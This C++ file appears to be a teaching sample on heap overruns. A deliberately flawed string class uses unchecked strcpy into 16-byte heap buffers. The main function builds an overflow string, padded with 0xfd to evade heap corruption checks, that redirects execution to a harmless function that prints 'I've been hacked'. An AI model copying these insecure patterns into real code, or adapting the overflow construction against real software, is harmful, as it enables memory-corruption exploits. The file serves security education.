/*
  HeapOverrun.cpp
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
  Very flawed class to demonstrate a problem
*/

class BadStringBuf
{
public:
    BadStringBuf(void)
    {
        m_buf = NULL;
    }

    ~BadStringBuf(void)
    {
        if(m_buf != NULL)
            free(m_buf);
    }

    void Init(char* buf)
    {
        //Really bad code
        m_buf = buf;
    }

    void SetString(const char* input)
    {
        //This is stupid.
        strcpy(m_buf, input);
    }

    const char* GetString(void)
    {
        return m_buf;
    }

private:
    char* m_buf;
};

//Declare a pointer to the BadStringBuf class to hold our  input.
BadStringBuf* g_pInput = NULL;

void bar(void)
{
    printf("Augh! I've been hacked!\n");
}

void BadFunc(const char* input1, const char* input2)
{
    //Someone told me that heap overruns weren't exploitable,
    //so we'll allocate our buffer on the heap.

    char* buf = NULL;
    char* buf2;

    buf2 = (char*)malloc(16);
    g_pInput = new BadStringBuf;
    buf = (char*)malloc(16);
    //Bad programmer - no error checking on allocations

    g_pInput->Init(buf2);

    //The worst that can happen is we'll crash, right???
    strcpy(buf, input1);

    g_pInput->SetString(input2);

    printf("input 1 = %s\ninput2 = %s\n", buf, g_pInput ->GetString());

    if(buf != NULL)
        free(buf);

}

int main(int argc, char* argv[])
{
    //Simulated argv strings
    char arg1[128];

    //This is the address of the bar function. 
    //It looks backwards because Intel processors are little  endian.
    char arg2[4] = {0x0f, 0x10, 0x40, 0};    
    int offset = 0x40;  
                  
    //Using 0xfd is an evil trick to overcome heap corruption  checking.
    //The 0xfd value at the end of the buffer checks for corr uption.
    //No error checking here –  it is just an example of how to 
    //construct an overflow string.
    memset(arg1, 0xfd, offset);
    arg1[offset]   = (char)0x94;
    arg1[offset+1] = (char)0xfe;
    arg1[offset+2] = (char)0x12;
    arg1[offset+3] = 0;
    arg1[offset+4] = 0;

    printf("Address of bar is %p\n", bar);
    BadFunc(arg1, arg2);

    if(g_pInput != NULL)
        delete g_pInput;

    return 0;
}
